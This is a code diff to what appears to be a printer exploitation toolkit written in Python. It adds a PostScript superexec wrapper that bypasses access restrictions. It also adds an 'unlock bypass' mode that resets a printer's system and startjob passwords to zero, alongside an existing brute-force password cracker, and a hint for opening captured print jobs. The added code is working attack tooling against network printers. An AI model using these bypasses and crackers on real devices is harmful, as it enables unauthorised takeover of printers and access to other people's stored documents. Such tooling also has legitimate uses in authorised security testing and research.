@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 
 # python standard library
-import re, os, string, random, json, collections
+import re, os, sys, string, random, json, collections
 
 # local pret classes
 from printer import printer
@@ -36,6 +36,10 @@ class postscript(printer):
   # send PostScript command, cause permanent changes
   def globalcmd(self, str_send, *stuff):
     return self.cmd(c.PS_GLOBAL + str_send, stuff)
+
+  # send PostScript command, bypass invalid access
+  def supercmd(self, str_send, *stuff):
+    return self.cmd('{' + str_send + '}' + c.PS_SUPER, stuff)
 
   # handle error messages from PostScript interpreter
   def ps_err(self, str_recv):
@@ -376,34 +380,43 @@ class postscript(printer):
              '/StartJobPassword (' + arg + ') '     # alter initial vm!
              '>> setsystemparams', False)
 
-  # ------------------------[ unlock <passwd> ]-------------------------
+  # ------------------------[ unlock <passwd>|"bypass" ]----------------
   def do_unlock(self, arg):
     "Unset startjob and system parameters password."
     max = 2**20 # exhaustive key search max value
-    if not arg: # ~140.000 tries/sec on lj4250, wtf?
+    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+    # note that only numeric passwords can be cracked right now
+    # according to the reference using 'reset' should also work:
+    # **********************************************************
+    # »if the system parameter password is forgotten, there is
+    # still a way to reset it [...] by passing a dictionary to
+    # setsystemparams in which FactoryDefaults is the only entry«
+    # **********************************************************
+    if not arg:
       print("No password given, cracking.")
-      # note that only numeric passwords can be cracked right now
-      # according to the reference using 'reset' should also work:
-      # **********************************************************
-      # »if the system parameter password is forgotten, there is
-      # still a way to reset it [...] by passing a dictionary to
-      # setsystemparams in which FactoryDefaults is the only entry«
-      # **********************************************************
+      output().chitchat("If this ain't successful, try 'unlock bypass'")
       timeout, timeout_old = self.timeout * 100, self.timeout
       self.do_timeout(timeout, True) # workaround: dynamic timeout
       arg = self.cmd('/min 0 def /max ' + str(max) + ' def\n'
              'statusdict begin { min 1 max\n'
              '  {dup checkpassword {== flush stop} {pop} ifelse} for\n'
-             '} stopped pop')
-      # restore original timeout
-      self.do_timeout(timeout_old, True)
-      if arg: output().raw("Found password: " + arg)
-      else: return output().warning("Cannot unlock")
-    # finally unlock device with password
-    self.cmd('<< /Password (' + arg + ') '
-             '/SystemParamsPassword () ' # mostly harmless settings
-             '/StartJobPassword () '     # permanent changes in VM
-             '>> setsystemparams', False)
+             '} stopped pop') # ~140.000 tries/sec on the lj4250, wtf?
+      self.do_timeout(timeout_old, True) # restore original timeout
+    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+    # superexec can be used to reset PostScript passwords on most devices
+    elif arg == 'bypass':
+      print("Resetting password to zero with super-secret PostScript magic")
+      self.supercmd('<< /SystemParamsPassword (0)'
+      ' /StartJobPassword (0) >> setsystemparams')
+      arg = '0' # assume we have successfully reset the passwords to zero
+    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+    # finally unlock device with user-supplied or cracked password
+    str_recv = self.cmd('{ << /Password (' + arg + ')\n'
+                        '  /SystemParamsPassword ()\n' # mostly harmless
+                        '  /StartJobPassword ()\n' # permanent VM change
+                        '  >> setsystemparams\n} stopped ==')
+    if not 'false' in str_recv: output().warning("Cannot unlock")
+    else: output().raw("Device unlocked with password: " + arg)
 
   # ------------------------[ restart ]---------------------------------
   def do_restart(self, arg):
@@ -725,6 +738,12 @@ class postscript(printer):
           print(str(len(data)) + " bytes received.")
           # write to local file
           if lpath and data: file().write(lpath, data)
+      if jobs:
+        reader = 'any PostScript reader'
+        if sys.platform == 'darwin': reader = 'Preview.app'       # OS X
+        if sys.platform.startswith('linux'): reader = 'Evince'    # Linux
+        if sys.platform in ['win32', 'cygwin']: reader = 'GSview' # Windows
+        self.chitchat("Saved jobs can be opened with " + reader)
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     # reprint saved print jobs
     elif arg.endswith('print'):
